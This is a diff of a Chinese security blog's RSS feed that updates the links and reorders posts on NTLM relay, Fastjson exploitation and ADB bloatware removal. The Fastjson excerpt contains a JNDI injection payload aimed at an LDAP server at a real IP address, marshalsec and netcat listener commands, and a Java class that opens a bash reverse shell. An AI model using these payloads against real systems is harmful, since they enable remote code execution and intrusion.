@@ -1,15 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
         <title>所有文章 - 柠檬k</title>
-        <link>https://example.com/posts/</link>
+        <link>https://songzhiv.github.io/posts/</link>
         <description>所有文章 | 柠檬k</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>songzhiv@126.com (nmk)</managingEditor>
-            <webMaster>songzhiv@126.com (nmk)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Fri, 18 Feb 2022 17:10:15 &#43;0800</lastBuildDate><atom:link href="https://example.com/posts/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>songzhiv@126.com (nmk)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Fri, 18 Feb 2022 17:10:15 &#43;0800</lastBuildDate><atom:link href="https://songzhiv.github.io/posts/" rel="self" type="application/rss+xml" /><item>
     <title>NTLM Relay</title>
-    <link>https://example.com/ntlm-relay/</link>
+    <link>https://songzhiv.github.io/ntlm-relay/</link>
     <pubDate>Fri, 18 Feb 2022 17:10:15 &#43;0800</pubDate>
     <author>作者</author>
-    <guid>https://example.com/ntlm-relay/</guid>
+    <guid>https://songzhiv.github.io/ntlm-relay/</guid>
     <description><![CDATA[本篇主要围绕下图进行。来自
 https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
 " https://www.thehacker.recipes/ad/movement/ntlm/relay 
@@ -27,30 +27,11 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
  https://github.com/ShutdownRepo/ShadowCoerce
 1  python3 shadowcoerce.]]></description>
 </item><item>
-    <title>Adb卸载手机原装软件</title>
-    <link>https://example.com/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/</link>
-    <pubDate>Tue, 01 Feb 2022 21:11:59 &#43;0800</pubDate>
-    <author>作者</author>
-    <guid>https://example.com/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/</guid>
-    <description><![CDATA[Adb卸载手机原装软件 我的手机系统是miui12.5，其他手机也类似
-准备 首先下载google adb工具并解压
- 进入开发者模式。miui中进入设置=》我的****设备=》全部参数。连续点击5下miui版本进入开发者模式。 数据线链接电脑。 回到设置中搜索框输入开发者选项，点进去找到USB调试，接受风险打开。 进入adb目录打开cmd或者powershell  输入.\adb.exe shell 显示下面这样就成功链接了
-卸载垃圾应用 命令 ==pm uninstall –user 0 com.miui.systemAdSolution== 最后跟的是应用的包名，包名可以在应用管理中查看，想卸载哪个应用就点开那个应用，把最后的包名替换就行了。success就表示成功了。
-下面是我卸载的应用
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  pm uninstall --user 0 com.miui.systemAdSolution（小米系统广告解决方案） pm uninstall --user 0 com.miui.analytics（小米广告分析） pm uninstall --user 0 com.miui.personalassistant（智能助理：既不智能，也不助理，除了卡，没别哒） pm uninstall --user 0 com.]]></description>
-</item><item>
-    <title>Config</title>
-    <link>https://example.com/config/</link>
-    <pubDate>Tue, 01 Feb 2022 21:11:59 &#43;0800</pubDate>
-    <author>作者</author>
-    <guid>https://example.com/config/</guid>
-    <description><![CDATA[<p>配置</p>]]></description>
-</item><item>
     <title>Fastjson利用总结</title>
-    <link>https://example.com/fastjson/</link>
-    <pubDate>Tue, 01 Feb 2022 21:11:59 &#43;0800</pubDate>
+    <link>https://songzhiv.github.io/fastjson/</link>
+    <pubDate>Tue, 01 Feb 2022 23:11:59 &#43;0800</pubDate>
     <author>作者</author>
-    <guid>https://example.com/fastjson/</guid>
+    <guid>https://songzhiv.github.io/fastjson/</guid>
     <description><![CDATA[0X01 漏洞利用 探测fastjson 对于有错误回显的情况
 使用{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;或者 &quot;{&quot;a&quot;:x&quot;通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了
 无回显使用dnslog探测POC：
@@ -60,5 +41,24 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
 无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下
 {&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.119.161.84:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}
  在我们的云服务器上开启LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit 同目录开启http服务：python3 -m http.server 80 NC监听：nc -lvvp 8888 javac编译下面恶意类，将编译好的Exploit.class文件放在http同目录下  1 2 3 4 5 6 7 8 9 10 11 12  public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(&#34;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/8888 0&gt;&amp;1&#34;); }catch(Exception e){ e.]]></description>
+</item><item>
+    <title>Adb卸载手机原装软件</title>
+    <link>https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/</link>
+    <pubDate>Tue, 01 Feb 2022 21:11:59 &#43;0800</pubDate>
+    <author>作者</author>
+    <guid>https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/</guid>
+    <description><![CDATA[Adb卸载手机原装软件 我的手机系统是miui12.5，其他手机也类似
+准备 首先下载google adb工具并解压
+ 进入开发者模式。miui中进入设置=》我的****设备=》全部参数。连续点击5下miui版本进入开发者模式。 数据线链接电脑。 回到设置中搜索框输入开发者选项，点进去找到USB调试，接受风险打开。 进入adb目录打开cmd或者powershell  输入.\adb.exe shell 显示下面这样就成功链接了
+卸载垃圾应用 命令 ==pm uninstall –user 0 com.miui.systemAdSolution== 最后跟的是应用的包名，包名可以在应用管理中查看，想卸载哪个应用就点开那个应用，把最后的包名替换就行了。success就表示成功了。
+下面是我卸载的应用
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  pm uninstall --user 0 com.miui.systemAdSolution（小米系统广告解决方案） pm uninstall --user 0 com.miui.analytics（小米广告分析） pm uninstall --user 0 com.miui.personalassistant（智能助理：既不智能，也不助理，除了卡，没别哒） pm uninstall --user 0 com.]]></description>
+</item><item>
+    <title>个人配置</title>
+    <link>https://songzhiv.github.io/config/</link>
+    <pubDate>Tue, 01 Feb 2022 21:11:59 &#43;0800</pubDate>
+    <author>作者</author>
+    <guid>https://songzhiv.github.io/config/</guid>
+    <description><![CDATA[<p>配置</p>]]></description>
 </item></channel>
 </rss>
